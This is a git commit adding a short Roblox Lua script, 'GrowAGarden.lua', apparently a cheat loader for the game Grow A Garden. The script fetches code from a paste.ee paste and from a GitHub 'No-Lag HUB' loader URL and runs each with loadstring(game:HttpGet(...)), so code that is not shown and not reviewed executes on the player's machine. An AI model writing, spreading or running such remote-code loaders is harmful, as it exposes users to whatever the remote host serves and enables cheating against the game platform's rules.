cbb81bf225d8ac0abb5af12621e32c2780f1aef1
vthangsitink <191318345+Day326@users.noreply.github.com>
2025-05-26 19:52:05 +0800

    GrowAGarden.lua

---
+++ GrowAGarden.lua
@@ -0,0 +1,9 @@
+local function gui()
+    loadstring(game:HttpGet("https://paste.ee/r/EJjqjqGq"))()
+end
+local function farm()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
+end
+ 
+task.spawn(gui)
+task.spawn(farm)
